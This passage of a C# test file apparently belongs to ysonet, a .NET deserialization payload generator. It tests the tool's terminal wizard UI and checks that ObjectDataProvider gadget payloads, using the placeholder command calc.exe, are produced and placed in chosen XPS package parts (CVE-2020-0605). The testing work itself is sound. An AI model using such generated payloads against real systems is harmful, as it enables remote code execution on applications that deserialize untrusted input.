                foreach (Frame f in k.Frames)
                    if (f.Contains("Pick a gadget")) { picker = f; break; }
                AssertTrue(picker != null, "the fallback picker rendered on a short window");
                AssertTrue(!picker.Contains("What do you want to do"),
                    "the top menu was cleared before the fallback picker (no stacking)");
            }
            finally
            {
                Term.Current = prevTerm;
                ModuleEditor.ForceFallback = prevForce;
            }
        }

        private static void WizardGenerateAndQuit()
        {
            // Generate and quit emits the payload and leaves interactive mode; if it
            // did NOT exit, the wizard would ask for more keys and the scripted
            // reader would run dry (throwing), so reaching the asserts proves it left.
            var keys = new ScriptedKeyReader();
            keys.Enter();                            // top -> gadget
            keys.Type("ObjectDataProvider").Enter(); // module picker
            keys.Type("formatter").Enter();          // open formatter
            keys.Digit(2);                           // Json.NET
            keys.Type("Generate and quit").Enter();  // generate + leave

            string stderr;
            byte[] got = DriveWizard(keys, out stderr);

            AssertTrue(BytesEqual(got, GenerateOdpJson("calc.exe")), "the payload was emitted");
            AssertTrue(!stderr.Contains("Bye."), "left via generate-and-quit, not the plain quit");
        }

        private static void ColumnsRenderInVirtualTerminal()
        {
            // Drive the REAL side-by-side columns path (not the fallback) against an
            // in-memory terminal, and assert on what it actually renders. This is the
            // headless stand-in for a real console: it catches layout, column-hiding,
            // and per-cell-highlight regressions.
            var prevTerm = Term.Current;
            bool prevForce = ModuleEditor.ForceFallback;
            var prevColors = ConsoleStyle.ColorOverrideForTest;
            var vt = new VirtualTerminal(120, 40);
            Term.Current = vt;
            ModuleEditor.ForceFallback = false; // exercise RunColumns, not the fallback
            // This test asserts on the COLORED per-cell selection bar, so force color on
            // for its scope: otherwise a NO_COLOR environment (the no-color.org
            // convention that ConsoleStyle honors) suppresses the background and there is
            // no bar to find. Restored in finally.
            ConsoleStyle.ColorOverrideForTest = true;
            try
            {
                var keys = new RecordingKeyReader(vt);
                keys.Enter();       // top menu -> Build a gadget payload
                keys.Enter();       // columns: open the first gadget's settings
                keys.Down().Down(); // move the setting selection
                keys.Escape();      // back to the modules column
                keys.Escape();      // leave the editor -> top menu
                keys.Escape();      // quit

                new Wizard(keys, new MemoryStream()).Run();
                var frames = keys.Frames;
                AssertTrue(frames.Count >= 6, "a frame was captured per keypress");

                // Module-list frame: the settings/editor columns are hidden here; the
                // right side instead shows the highlighted gadget's info panel.
                Frame modules = FindFrame(frames, f => f.Contains("Gadgets") && f.Contains("- Info")
                    && f.Contains("Formatters:") && !f.Contains("[ Generate"));
                AssertTrue(modules != null, "module list shows the info panel, not the settings columns");

                // A three-column settings frame with the action rows.
                Frame settings = FindFrame(frames, f => f.Contains(" | ") && f.Contains("[ Generate and quit ]"));
                AssertTrue(settings != null, "three-column settings view rendered");
                AssertTrue(settings.Contains("command"), "command setting shown");
                AssertTrue(settings.Contains("formatter"), "formatter setting shown");
                AssertTrue(settings.Contains("[ Generate ]") && settings.Contains("[ Show ysonet command ]"), "all actions shown");

                // Per-cell highlight: the selection bar covers only the settings
                // column's current cell, not the whole row (the bug we fixed).
                int barRow = -1;
                for (int y = 0; y < settings.Height && barRow < 0; y++)
                    for (int x = 25; x < settings.Width; x++)
                        if (settings.Bg(x, y) == ConsoleStyle.SelectBg) { barRow = y; break; }
                AssertTrue(barRow >= 0, "a selection bar is drawn in the settings column");
                AssertTrue(settings.Bg(2, barRow) != ConsoleStyle.SelectBg,
                    "the modules column is NOT part of the settings selection bar (per-cell highlight)");
            }
            finally
            {
                Term.Current = prevTerm;
                ModuleEditor.ForceFallback = prevForce;
                ConsoleStyle.ColorOverrideForTest = prevColors;
            }
        }

        private static Frame FindFrame(List<Frame> frames, Func<Frame, bool> pred)
        {
            foreach (Frame f in frames)
                if (pred(f)) return f;
            return null;
        }

        private static void ColumnFilterNarrowsModules()
        {
            // On the gadget module list, typing "Windows" narrows it to the gadgets
            // whose name contains that substring. The active filter is tagged in the
            // header, and a matching gadget is shown.
            var frames = DriveFrames(k => k.Enter()              // build a gadget -> module list
                .Type("Windows")                                 // filter the modules
                .Escape().Escape().Escape());                    // clear filter, leave, quit
            AssertTrue(AnyFrame(frames, "/Windows"), "the active module filter is tagged in the header");
            AssertTrue(AnyFrame(frames, "WindowsIdentity"), "a substring match is shown while filtering");

            // A filter that matches nothing produces a match-free list (no gadget rows),
            // but does not crash the redraw.
            var none = DriveFrames(k => k.Enter().Type("zznomatch").Escape().Escape().Escape());
            AssertTrue(AnyFrame(none, "/zznomatch"), "a no-match filter is still tagged");
        }

        private static void ColumnFilterNarrowsSettings()
        {
            // Inside a gadget's settings, typing "out" narrows the list to the settings
            // whose label contains "out" (output, outputpath).
            var frames = DriveFrames(k => k.Enter().Enter()      // open the first gadget's settings
                .Type("out")                                     // filter the settings
                .Escape().Escape().Escape().Escape());
            AssertTrue(AnyFrame(frames, "/out"), "the active settings filter is tagged in the header");
            AssertTrue(AnyFrame(frames, "outputpath"), "a substring match is shown while filtering settings");
        }

        private static void ModuleInfoPanelShowsFacts()
        {
            // On the gadget module list (before opening one), the right side shows the
            // highlighted gadget's info so a user can choose: its formatters and what
            // the -c command means.
            var gadget = DriveFrames(k => k.Enter().Escape().Escape());
            AssertTrue(AnyFrame(gadget, "- Info"), "the info panel header shows for the highlighted gadget");
            AssertTrue(AnyFrame(gadget, "Formatters:"), "the gadget info lists its formatters");
            AssertTrue(AnyFrame(gadget, "Command input:"), "the gadget info states what the command means");

            // On the plugin module list, the info panel lists the plugin's options.
            var plugin = DriveFrames(k => k.Digit(2).Escape().Escape());
            AssertTrue(AnyFrame(plugin, "- Info"), "the info panel header shows for the highlighted plugin");
            AssertTrue(AnyFrame(plugin, "Options:"), "the plugin info lists its options");
        }

        private static void FilterFieldsUnit()
        {
            var fields = new List<EditableField>
            {
                new EditableField { Label = "command" },
                new EditableField { Label = "output" },
                new EditableField { Label = "outputpath" },
                new EditableField { Label = "formatter" },
            };
            // Empty query is a pass-through (same list instance/contents).
            AssertEqual(4, ModuleEditor.FilterFieldsForTest(fields, "").Count, "empty query keeps all");
            var outp = ModuleEditor.FilterFieldsForTest(fields, "out");
            AssertEqual(2, outp.Count, "two labels contain 'out'");
            AssertEqual("output", outp[0].Label, "order is preserved");
            AssertEqual("outputpath", outp[1].Label, "order is preserved");
            // Case-insensitive substring, not just prefix.
            AssertEqual(1, ModuleEditor.FilterFieldsForTest(fields, "MAND").Count, "case-insensitive substring match");
        }

        private static void SentenceCasingUnit()
        {
            AssertEqual("Hello there", ModuleEditor.SentenceForTest("hello there"), "lower-case first letter is capitalized");
            AssertEqual("Already up", ModuleEditor.SentenceForTest("Already up"), "an already-capital first letter is left alone");
            AssertEqual("'winforms' mode", ModuleEditor.SentenceForTest("'winforms' mode"), "a non-letter start (a quoted token) is left alone");
            AssertEqual("", ModuleEditor.SentenceForTest(""), "empty stays empty");
        }

        // Drive the interactive UI against a fresh virtual terminal (real columns
        // path) and return every rendered frame.
        private static List<Frame> DriveFrames(Action<RecordingKeyReader> build)
        {
            var prevTerm = Term.Current;
            bool prevForce = ModuleEditor.ForceFallback;
            var vt = new VirtualTerminal(120, 40);
            Term.Current = vt;
            ModuleEditor.ForceFallback = false;
            try
            {
                var k = new RecordingKeyReader(vt);
                build(k);
                try { new Wizard(k, new MemoryStream()).Run(); } catch { }
                return k.Frames;
            }
            finally
            {
                Term.Current = prevTerm;
                ModuleEditor.ForceFallback = prevForce;
            }
        }

        private static bool AnyFrame(List<Frame> frames, string needle)
        {
            foreach (Frame f in frames)
                if (f.Contains(needle)) return true;
            return false;
        }

        // Drive the interactive UI against a virtual terminal but pinned to the
        // single-panel FALLBACK path (ForceFallback) with real cursor control on, so
        // the fallback's clear/redraw is exercised the way a short real console uses it.
        // A short/redirected console is exactly where the residual/stacking bugs live,
        // and only a real-cursor harness (not the redirected-stderr tests) can catch them.
        private static List<Frame> DriveFallbackFrames(Action<RecordingKeyReader> build)
        {
            var prevTerm = Term.Current;
            bool prevForce = ModuleEditor.ForceFallback;
            var vt = new VirtualTerminal(80, 24);
            Term.Current = vt;
            ModuleEditor.ForceFallback = true; // single-panel path, not the columns view
            try
            {
                var k = new RecordingKeyReader(vt);
                build(k);
                try { new Wizard(k, new MemoryStream()).Run(); } catch { }
                return k.Frames;
            }
            finally
            {
                Term.Current = prevTerm;
                ModuleEditor.ForceFallback = prevForce;
            }
        }

        // The last captured frame that matches a predicate (for "the screen as it
        // settled after the final navigation of interest").
        private static Frame LastFrame(List<Frame> frames, Func<Frame, bool> pred)
        {
            Frame found = null;
            foreach (Frame f in frames)
                if (pred(f)) found = f;
            return found;
        }

        private static void FallbackFormClearsModulePreview()
        {
            // Fallback path: open a gadget's settings form. The module picker showed the
            // gadget info preview (Formatters/Labels/Credit); the settings form must clear
            // it, not leave it stacked above the form (the reported residual on a small
            // window). A redirected-stderr test cannot see this - the clear is a no-op
            // there - so it runs on the real-cursor virtual terminal.
            var frames = DriveFallbackFrames(k => k
                .Enter()                                 // top -> Build a gadget payload
                .Type("ObjectDataProvider").Enter()      // pick the module -> settings form
                .Escape()                                // leave the form -> module list
                .Escape()                                // leave the list -> top menu
                .Escape());                              // quit
            AssertTrue(AnyFrame(frames, "Formatters:"),
                "the module picker showed the gadget info preview at some point");
            Frame form = LastFrame(frames, f => f.Contains("type to find a setting"));
            AssertTrue(form != null, "the settings form rendered in the fallback path");
            AssertTrue(!form.Contains("Formatters:"),
                "the settings form cleared the module-picker preview (no residual)");
            AssertTrue(!form.Contains("What do you want to do"),
                "the settings form cleared the top menu (no residual)");
            AssertTrue(RowsContaining(form, "type to find a setting") <= 1,
                "the settings form is drawn once, not stacked");
        }

        private static void FallbackFormClearsEditResidual()
        {
            // Fallback path: open a field editor from the settings form, then Esc back.
            // The editor is its own screen and the returned form must be clean - the two
            // must never be sandwiched on one screen (the residual/stacking bug).
            var frames = DriveFallbackFrames(k => k
                .Enter()                                 // top -> Build a gadget payload
                .Type("ObjectDataProvider").Enter()      // pick the module -> settings form
                .Type("formatter").Enter()               // open the formatter field editor
                .Escape()                                // cancel the editor -> back to the form
                .Escape()                                // leave the form -> module list
                .Escape()                                // leave the list -> top menu
                .Escape());                              // quit
            AssertTrue(AnyFrame(frames, "Set formatter"), "the field editor rendered");
            // No single frame shows the form title and the editor title together: they
            // are always on separate cleared screens.
            foreach (Frame f in frames)
                AssertTrue(!(f.Contains("type to find a setting") && f.Contains("Set formatter")),
                    "the editor and the settings form are never drawn on the same screen (no residual)");
        }

        private static void AllMenusRender()
        {
            AssertTrue(AnyFrame(DriveFrames(k => k.Escape()), "Build a gadget payload"), "top menu renders");
            AssertTrue(AnyFrame(DriveFrames(k => k.Enter().Enter().Escape().Escape().Escape()), "[ Generate and quit ]"), "gadget settings render");
            // Type-to-filter to the plugin by NAME. This used to press Up to land on the
            // last plugin in the list, which silently meant "ViewState is last" and broke
            // the moment a plugin sorting after it was added.
            AssertTrue(AnyFrame(DriveFrames(k => k.Digit(2).Type("ViewState").Enter().Escape().Escape().Escape()), "ViewState Settings"), "plugin settings render");
            AssertTrue(AnyFrame(DriveFrames(k => k.Digit(3).Type("Json").Enter().Enter().Escape()), "Gadgets with a formatter"), "search formatters renders");
            AssertTrue(AnyFrame(DriveFrames(k => k.Digit(4).Escape().Escape()), "What kind of input"), "run-all-formatters renders");
            AssertTrue(AnyFrame(DriveFrames(k => k.Digit(6).Enter().Escape()), "Pick 'gadget'"), "help renders");
            AssertTrue(AnyFrame(DriveFrames(k => k.Digit(5).Enter().Escape()), "developed and maintained"), "credits render");
            AssertTrue(AnyFrame(DriveFrames(k => k.Digit(7).Down().Escape().Escape()), "Pick a color theme"), "theme picker renders");
        }

        private static void TextEditAppends()
        {
            // Open a gadget, edit the command (a text setting). The box is pre-filled
            // with the current value and the caret sits at the end, so typing APPENDS
            // (it does not wipe the value). (Enter opens the gadget flow, Enter opens
            // the first gadget, then we type-to-filter to 'command' and Enter edits it -
            // robust against field-order changes such as a hidden bridgedgadgetchain.)
            var frames = DriveFrames(k => k.Enter().Type("ObjectDataProvider").Enter().Type("command").Enter()
                .Type("X").Escape().Escape().Escape().Escape());
            // The full value is echoed in the footer (so a long value stays visible for
            // reading/copying); the edit box itself shows it with a block caret.
            AssertTrue(AnyFrame(frames, "Editing command: calc.exe"), "the box is pre-filled with the current value");
            AssertTrue(AnyFrame(frames, "Editing command: calc.exeX"), "typing appends at the end (does not replace)");

            // Ctrl+U clears the whole line, so you can quickly type a fresh value.
            var replaced = DriveFrames(k => k.Enter().Type("ObjectDataProvider").Enter().Type("command").Enter()
                .CtrlU().Type("notepad").Escape().Escape().Escape().Escape());
            AssertTrue(AnyFrame(replaced, "Editing command: notepad"), "Ctrl+U clears, then typing sets a new value");

            // Backspacing the value away empties the box (Enter would then save empty).
            var cleared = DriveFrames(k => k.Enter().Type("ObjectDataProvider").Enter().Type("command").Enter()
                .Backspace(8).Escape().Escape().Escape().Escape()); // "calc.exe" is 8 chars
            AssertTrue(AnyFrameRowTrimmed(cleared, "Editing command:"), "backspacing the value empties the box");
        }

        private static void TextEditWordOps()
        {
            // Ctrl+Backspace deletes the whole word to the left. Type "abc def", then
            // Ctrl+Backspace removes "def" and typing "Z" gives "abc Z" (a sentinel that
            // only arises if the word delete happened). Ctrl+U clears first.
            var del = DriveFrames(k => k.Enter().Type("ObjectDataProvider").Enter().Type("command").Enter()
                .CtrlU().Type("abc def").CtrlBackspace().Type("Z")
                .Escape().Escape().Escape().Escape());
            AssertTrue(AnyFrame(del, "Editing command: abc Z"), "Ctrl+Backspace deletes the word to the left");

            // Ctrl+Left moves by a word, so typing lands before that word: from the end
            // of "abc def", Ctrl+Left puts the caret before "def"; typing "Z" gives
            // "abc Zdef".
            var move = DriveFrames(k => k.Enter().Type("ObjectDataProvider").Enter().Type("command").Enter()
                .CtrlU().Type("abc def").CtrlLeft().Type("Z")
                .Escape().Escape().Escape().Escape());
            AssertTrue(AnyFrame(move, "Editing command: abc Zdef"), "Ctrl+Left jumps a whole word");
        }

        private static void TextEditWrapsInPlace()
        {
            // A value longer than the editor column wraps onto the next line in place
            // (no separate page). Type a long no-space value; it appears wrapped in the
            // edit box across more than one row, and in full on one line in the footer.
            string longVal = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaXY";
            var frames = DriveFrames(k => k.Enter().Type("ObjectDataProvider").Enter().Type("command").Enter()
                .CtrlU().Type(longVal).Escape().Escape().Escape().Escape());
            // The tail "XY" is only reachable if the value wrapped onto a later row of
            // the box (the first row is full of 'a's), so seeing it proves in-place wrap.
            AssertTrue(AnyFrame(frames, "XY"), "a long value wraps onto the next row of the edit box");
        }

        // True when some frame has a row whose trimmed text equals exactly `s`.
        private static bool AnyFrameRowTrimmed(List<Frame> frames, string s)
        {
            foreach (Frame f in frames)
                for (int y = 0; y < f.Height; y++)
                    if (f.Row(y).Trim() == s) return true;
            return false;
        }

        private static void TextEditCaretEditing()
        {
            // Left moves the caret so you can insert in the middle, not only append.
            var mid = DriveFrames(k => k.Enter().Type("ObjectDataProvider").Enter().Type("command").Enter()
                .Left().Left().Type("X").Escape().Escape().Escape().Escape());
            AssertTrue(AnyFrame(mid, "Editing command: calc.eXxe"), "Left caret then type inserts in the middle");

            // Home jumps to the start; Delete removes the character at the caret.
            var del = DriveFrames(k => k.Enter().Type("ObjectDataProvider").Enter().Type("command").Enter()
                .Home().Delete().Escape().Escape().Escape().Escape());
            AssertTrue(AnyFrame(del, "Editing command: alc.exe"), "Home then Delete removes the first character");
        }

        private static void FocusedValueInFooter()
        {
            // Navigating onto a value setting shows its full value in the footer, so a
            // long value (truncated in the narrow column) can be read and copied out.
            var frames = DriveFrames(k => k.Enter().Type("ObjectDataProvider").Enter().Down().Escape().Escape().Escape());
            AssertTrue(AnyFrame(frames, "command = calc.exe"), "the focused setting's full value shows in the footer");
        }

        private static void LineEditBufferUnit()
        {
            // Opens pre-filled with the caret at the end, so typing appends.
            var b = new LineEditBuffer("calc.exe");
            AssertEqual(8, b.Caret, "caret starts at the end");
            b.Insert('X');
            AssertEqual("calc.exeX", b.Text, "typing appends at the end");

            // Caret move + insert edits in the middle.
            var e = new LineEditBuffer("abc");
            e.Left();                            // caret to 2
            e.Insert('X');                       // insert before 'c'
            AssertEqual("abXc", e.Text, "Left then insert edits in the middle");
            AssertEqual(3, e.Caret, "caret advances past the inserted character");

            // Home/End + character delete.
            var d = new LineEditBuffer("abc");
            d.Home(); d.Delete();
            AssertEqual("bc", d.Text, "Home then Delete removes the first character");
            d.End(); d.Backspace();
            AssertEqual("b", d.Text, "End then Backspace removes the last character");

            // Clear empties the whole line.
            var cl = new LineEditBuffer("something");
            cl.Clear();
            AssertEqual("", cl.Text, "Clear empties the line");
            AssertEqual(0, cl.Caret, "Clear resets the caret");

            // Word operations treat runs of non-space as words.
            var w = new LineEditBuffer("cmd /c calc"); // caret at end (11)
            w.DeleteWordLeft();
            AssertEqual("cmd /c ", w.Text, "DeleteWordLeft removes the last word");
            var w2 = new LineEditBuffer("cmd /c calc");
            w2.WordLeft();                       // caret before "calc"
            w2.Insert('X');
            AssertEqual("cmd /c Xcalc", w2.Text, "WordLeft jumps a whole word");
            var w3 = new LineEditBuffer("cmd /c calc");
            w3.Home(); w3.DeleteWordRight();
            AssertEqual(" /c calc", w3.Text, "DeleteWordRight removes the word at the caret");

            // Caret clamps at both ends.
            var c = new LineEditBuffer("x");
            c.Left(); c.Left();
            AssertEqual(0, c.Caret, "caret clamps at 0");
            c.Right(); c.Right();
            AssertEqual(1, c.Caret, "caret clamps at length");
        }

        // Dev inspection: walk every interactive menu/screen in the virtual terminal
        // and print a captured frame of each, so a human/AI can eyeball the real UI.
        private static void DumpUi()
        {
            Func<Action<RecordingKeyReader>, List<Frame>> run = build =>
            {
                var vt = new VirtualTerminal(120, 40);
                Term.Current = vt;
                ModuleEditor.ForceFallback = false;
                var k = new RecordingKeyReader(vt);
                build(k);
                try { new Wizard(k, new MemoryStream()).Run(); } catch { }
                return k.Frames;
            };
            Action<string, List<Frame>, string, bool> show = (label, fs, needle, last) =>
            {
                Frame f = null;
                foreach (Frame x in fs) { if (x.Contains(needle)) { f = x; if (!last) break; } }
                Console.WriteLine("\n#################### " + label + " ####################");
                Console.WriteLine(f == null ? "(not captured: '" + needle + "')" : f.Text());
            };

            var top = run(k => k.Escape());
            show("TOP MENU", top, "What do you want to do", false);

            var gadget = run(k => k.Enter().Type("ObjectDataProvider").Enter().Down().Down().Escape().Escape().Escape());
            show("GADGET MODULES (right columns hidden)", gadget, "Gadgets", false);
            show("GADGET SETTINGS (columns)", gadget, "[ Generate and quit ]", false);

            var textEdit = run(k => k.Enter().Type("ObjectDataProvider").Enter().Type("command").Enter().Type("notepad").Escape().Escape().Escape().Escape());
            show("EDIT A TEXT SETTING (command)", textEdit, "Edit: command", true);

            var choice = run(k => k.Enter().Type("ObjectDataProvider").Enter().Type("formatter").Enter().Escape().Escape().Escape().Escape());
            show("EDIT A CHOICE SETTING (formatter)", choice, "Edit: formatter", false);

            var showCmd = run(k => k.Enter().Type("ObjectDataProvider").Enter().Up().Enter().Enter().Escape().Escape().Escape());
            show("SHOW YSONET COMMAND action", showCmd, "Equivalent one-line command", false);

            var gen = run(k => k.Enter().Type("ObjectDataProvider").Enter().Up().Up().Up().Up().Enter().Enter().Escape().Escape().Escape());
            show("GENERATE action output", gen, "Payload (", false);

            var plugin = run(k => k.Digit(2).Type("ViewState").Enter().Escape().Escape().Escape());
            show("PLUGIN SETTINGS (ViewState)", plugin, "ViewState Settings", false);

            var theme = run(k => k.Digit(7).Down().Down().Escape().Escape());
            show("THEME PICKER (live preview)", theme, "Pick a color theme", false);

            var search = run(k => k.Digit(3).Type("Json").Enter().Enter().Escape());
            show("SEARCH FORMATTERS", search, "Gadgets with a formatter", true);

            var help = run(k => k.Digit(6).Enter().Escape());
            show("HELP", help, "Pick 'gadget'", false);

            var credits = run(k => k.Digit(5).Enter().Escape());
            show("CREDITS", credits, "developed and maintained", false);
        }

        private static void WizardShowCommand()
        {
            // The show-command action prints the equivalent one-liner and generates
            // nothing (no payload on stdout).
            var keys = new ScriptedKeyReader();
            keys.Enter();                            // top -> gadget
            keys.Type("ObjectDataProvider").Enter(); // module picker
            keys.Type("formatter").Enter();          // open formatter
            keys.Digit(2);                           // Json.NET
            keys.Type("Show ysonet").Enter();        // show-command action
            keys.Escape();                           // leave form
            keys.Escape();                           // leave module list
            keys.Escape();                           // quit

            string stderr;
            byte[] stdout = DriveWizard(keys, out stderr);

            AssertEqual(0, stdout.Length, "show-command does not generate a payload");
            AssertTrue(stderr.Contains("Equivalent one-line command"), "prints the command header");
            AssertTrue(stderr.Contains("-g ObjectDataProvider -f Json.NET"), "prints the gadget command line");
        }

        private static void WizardRemembersLastCommand()
        {
            // Build ODP twice in one session. The first flow types "notepad.exe";
            // the second leaves the command at its default, which must be the
            // remembered command from the first flow.
            var keys = new ScriptedKeyReader();
            // flow 1: ODP / Json.NET / "notepad.exe"
            keys.Enter().Type("ObjectDataProvider").Enter();
            keys.Type("formatter").Enter().Digit(2);      // Json.NET
            keys.Type("command").Enter().TypeLine("notepad.exe");
            keys.Type("Generate").Enter();
            keys.Escape();                                // leave form -> module list
            // flow 2: ODP again, command left at the remembered default
            keys.Type("ObjectDataProvider").Enter();
            keys.Type("formatter").Enter().Digit(2);      // Json.NET
            keys.Type("Generate").Enter();
            keys.Escape();                                // leave form -> module list
            keys.Escape();                                // leave module list -> top
            keys.Escape();                                // quit

            string stderr;
            byte[] got = DriveWizard(keys, out stderr);
            byte[] one = GenerateOdpJson("notepad.exe");

            AssertEqual(one.Length * 2, got.Length, "two payloads emitted back to back");
            byte[] first = new byte[one.Length];
            byte[] second = new byte[one.Length];
            Array.Copy(got, 0, first, 0, one.Length);
            Array.Copy(got, one.Length, second, 0, one.Length);
            AssertTrue(BytesEqual(first, one), "first payload uses the typed command");
            AssertTrue(BytesEqual(second, one), "second payload reused the remembered command");
        }

        private static void WizardRunAllFormatters()
        {
            // The reported bug: this sweep exited the wizard because some gadgets
            // reject a shell command (they expect a file/URL/DLL). It must now run
            // to completion, skip those gracefully, and emit nothing to stdout.
            var keys = new ScriptedKeyReader();
            keys.Digit(4);                     // top menu -> Run all formatters (index 3)
            keys.Enter();                      // input type -> Shell command (index 0)
            keys.Type("BinaryFormatter").Enter(); // formatter picker filter + pick
            keys.TypeLine("calc.exe");         // command
            keys.Enter();                      // output format -> auto
            keys.Digit(3);                     // destination -> "Just show payload lengths" (index 2)
            keys.Escape();                     // back at top menu -> quit

            string stderr;
            byte[] stdout = DriveWizard(keys, out stderr);

            AssertEqual(0, stdout.Length, "sweep writes nothing to stdout");
            AssertTrue(stderr.Contains("Shell command ("), "input types listed with gadget counts");
            AssertTrue(stderr.Contains("Done."), "sweep ran to completion");
            AssertTrue(stderr.Contains("will run with"), "non-empty gadget set previewed before running");
            AssertTrue(stderr.Contains("[ok]"), "at least one gadget generated");
            AssertTrue(!stderr.Contains("length 0"), "empty payloads are skipped, not counted as ok");
        }

        private static void WizardRunAllFormattersToFolder()
        {
            string folder = TestArtifactPath("ysonet_raf_test");
            if (Directory.Exists(folder))
                Directory.Delete(folder, true);

            var keys = new ScriptedKeyReader();
            keys.Digit(4);                     // top -> Run all formatters
            keys.Enter();                      // input type -> Shell command (index 0)
            keys.Type("BinaryFormatter").Enter(); // formatter picker filter + pick
            keys.TypeLine("calc.exe");         // command
            keys.Enter();                      // output format -> auto
            keys.Digit(1);                     // destination -> "Save each to its own file" (index 0)
            keys.TypeLine(folder);             // folder path
            keys.Escape();                     // back at top -> quit

            string stderr;
            byte[] stdout = DriveWizard(keys, out stderr);

            AssertEqual(0, stdout.Length, "sweep writes nothing to stdout");
            AssertTrue(Directory.Exists(folder), "output folder created");
            string[] files = Directory.GetFiles(folder);
            AssertTrue(files.Length > 0, "payload files were written");
            long biggest = 0;
            foreach (string p in files)
            {
                long n = new FileInfo(p).Length;
                if (n > biggest) biggest = n;
            }
            AssertTrue(biggest > 0, "written payloads are non-empty");

            // Variant-capable gadgets that support BinaryFormatter (e.g.
            // GenericPrincipal, GetterSecurityException) emit one file per variant.
            bool anyVariantFile = false;
            foreach (string p in files)
                if (Path.GetFileName(p).Contains("_v"))
                    anyVariantFile = true;
            AssertTrue(anyVariantFile, "variant-suffixed files were produced");

            try { Directory.Delete(folder, true); } catch { }
        }

        private static void ClipboardWpfXamlOptions()
        {
            // The new delivery mode must be reachable through the plugin's own
            // OptionSet, which is what the CLI parses and the wizard introspects.
            var plugin = new ClipboardPlugin();
            var fields = OptionField.FromOptionSet(plugin.Options());

            OptionField modeField = FindField(fields, "mode");
            AssertTrue(modeField != null, "mode option present");
            AssertTrue(modeField.TakesValue, "mode takes a value");
            AssertEqual("m", modeField.ShortName, "mode has -m short name");

            OptionField variantField = FindField(fields, "xamlvariant");
            AssertTrue(variantField != null, "xamlvariant option present");
            AssertTrue(variantField.TakesValue, "xamlvariant takes a value");

            // The original winforms knobs are still there (mode is additive).
            AssertTrue(FindField(fields, "format") != null, "format option still present");
            AssertTrue(FindField(fields, "command") != null, "command option still present");
        }

        // The Xps plugin's four interactive modes are the four markup parts the payload can
        // ride in. Each must preset its own --mode value, because that is the only thing
        // separating them; there is no per-mode option to show or hide.
        private static void XpsModes()
        {
            var editor = new ModuleEditor(null, null, false, null, null);
            var f = editor.BuildFieldsForTest("Xps");
            EditableField mode = FindEditable(f, "mode");
            AssertTrue(mode != null && mode.Choices.Count == 4, "four Xps part modes");

            FindEditable(f, "command").Value = "calc.exe";
            FindEditable(f, "command").Touched = true;

            // Default is the start part, the classic CVE-2020-0605 shape.
            string a1 = string.Join(" ", editor.PluginArgvForTest().ToArray());
            AssertTrue(a1.Contains("--mode fdseq"), "default argv has the fdseq mode: " + a1);

            // Every other mode maps to a value the CLI accepts.
            var seen = new List<string>();
            for (int i = 0; i < mode.Choices.Count; i++)
            {
                mode.Value = mode.Choices[i];
                editor.RefreshDynamicForTest();
                string argv = string.Join(" ", editor.PluginArgvForTest().ToArray());
                foreach (string token in new[] { "fdseq", "fdoc", "fpage", "all" })
                    if (argv.Contains("--mode " + token)) seen.Add(token);
            }
            AssertTrue(seen.Contains("fdseq") && seen.Contains("fdoc")
                && seen.Contains("fpage") && seen.Contains("all"),
                "the four modes produce the four --mode values: " + string.Join(",", seen.ToArray()));
        }

        // The generated file must be a real XPS package, not just a ZIP with markup in it:
        // an application only reaches the XAML through the start part relationship and the
        // XPS content types. This also pins WHICH part carries the gadget per mode, so a
        // regression to "valid document, payload in the wrong place" fails loudly.
        private static void XpsPackageStructure()
        {
            const string seqPart = "/FixedDocSeq.fdseq";
            const string docPart = "/Documents/1/FixedDoc.fdoc";
            const string pagePart = "/Documents/1/Pages/1.fpage";
            const string startRel = "http://schemas.microsoft.com/xps/2005/06/fixedrepresentation";

            var expectedTypes = new Dictionary<string, string>
            {
                { seqPart, "application/vnd.ms-package.xps-fixeddocumentsequence+xml" },
                { docPart, "application/vnd.ms-package.xps-fixeddocument+xml" },
                { pagePart, "application/vnd.ms-package.xps-fixedpage+xml" },
            };

            // mode -> the parts that must contain the gadget.
            var payloadParts = new Dictionary<string, string[]>
            {
                { "fdseq", new[] { seqPart } },
                { "fdoc", new[] { docPart } },
                { "fpage", new[] { pagePart } },
                { "all", new[] { seqPart, docPart, pagePart } },
            };

            foreach (KeyValuePair<string, string[]> kv in payloadParts)
            {
                string mode = kv.Key;
                RunResult r = PayloadRunner.RunPlugin("Xps", new[] { "-m", mode, "-c", "calc.exe" });
                AssertTrue(r.Success, "Xps -m " + mode + " runs: " + r.ErrorMessage);

                byte[] bytes = Bytes(r.Raw);
                AssertTrue(bytes != null && bytes.Length > 0, "Xps -m " + mode + " produced bytes");

                var carriesPayload = new List<string>(kv.Value);

                using (var ms = new MemoryStream(bytes))
                using (System.IO.Packaging.Package package =
                    System.IO.Packaging.Package.Open(ms, FileMode.Open, FileAccess.Read))
                {
                    // The start part relationship is what makes this an XPS document.
                    bool startPartFound = false;
                    foreach (System.IO.Packaging.PackageRelationship rel in package.GetRelationshipsByType(startRel))
                        if (rel.TargetUri.ToString().TrimStart('/') == seqPart.TrimStart('/')) startPartFound = true;
                    AssertTrue(startPartFound, "Xps -m " + mode + " has the start part relationship to " + seqPart);

                    foreach (KeyValuePair<string, string> part in expectedTypes)
                    {
                        Uri uri = new Uri(part.Key, UriKind.Relative);
                        AssertTrue(package.PartExists(uri), "Xps -m " + mode + " has part " + part.Key);

                        System.IO.Packaging.PackagePart p = package.GetPart(uri);
                        AssertTrue(p.ContentType.StartsWith(part.Value),
                            "Xps -m " + mode + " part " + part.Key + " has content type " + part.Value
                            + " (was " + p.ContentType + ")");

                        string markup;
                        using (Stream s = p.GetStream(FileMode.Open, FileAccess.Read))
                        using (var reader = new StreamReader(s, Encoding.UTF8))
                            markup = reader.ReadToEnd();

                        bool hasGadget = markup.Contains("ObjectDataProvider");
                        bool shouldHaveGadget = carriesPayload.Contains(part.Key);
                        AssertTrue(hasGadget == shouldHaveGadget,
                            "Xps -m " + mode + " part " + part.Key
                            + (shouldHaveGadget ? " must carry the gadget" : " must NOT carry the gadget"));

                        if (shouldHaveGadget)
                        {
                            AssertTrue(markup.Contains("calc.exe"),
                                "Xps -m " + mode + " part " + part.Key + " carries the command");
                            // The gadget is embedded as a child element, so a nested XML
                            // declaration (which XamlWriter emits for a standalone document)
                            // would make the part malformed.
                            AssertTrue(markup.IndexOf("<?xml", StringComparison.Ordinal) < 0,
                                "Xps -m " + mode + " part " + part.Key + " has no embedded XML declaration");
                        }
                    }
                }
            }
        }

        // Bad input is reported, not silently turned into a different document.
        private static void XpsRejectsBadInput()
        {
